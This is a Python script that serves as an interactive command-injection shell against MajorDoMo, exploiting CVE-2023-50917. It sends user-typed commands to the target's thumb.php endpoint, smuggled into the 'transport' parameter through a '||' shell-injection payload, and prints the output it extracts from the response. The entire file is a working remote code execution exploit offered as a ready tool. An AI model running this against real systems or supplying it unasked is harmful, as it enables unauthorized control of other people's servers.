import os
import re
import requests
import argparse
from pyfiglet import Figlet
from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def inject_command(base_url, command):
    target_url = f"{base_url}/modules/thumb/thumb.php"
    params = {
        "url": "cnRzcDovL2EK",
        "debug": "1",
        "transport": f"|| (echo '[S]'; {command}; echo '[E]')#;"
    }
    response = requests.get(target_url, params=params)
    matches = re.findall(r'\[S\](.*?)\[E\]', response.text, re.DOTALL)
    if matches and len(matches) > 1:
        return matches[1].strip()
    return "No output detected."

def main():
    parser = argparse.ArgumentParser(description="Inject commands into a vulnerable endpoint.")
    parser.add_argument("-u", "--url", required=True, help="Base URL (e.g., http://localhost)")
    args = parser.parse_args()

    console = Console()

    figlet = Figlet(font="digital")  
    session = PromptSession(history=InMemoryHistory())

    clear_screen()
    console.print(figlet.renderText("Command Injector"), style="bold green")

    while True:
        try:
            command = session.prompt("MajorDoMo@CVE-2023-50917:~$ ")
            if command.lower() == 'exit':
                break
            if command.lower() == 'clear':
                clear_screen()
                continue
            result = inject_command(args.url, command)
            console.print(result, style="italic")
            print()
        except KeyboardInterrupt:
            break
        except Exception as e:
            console.print(f"Error: {e}", style="bold red")

if __name__ == "__main__":
    main()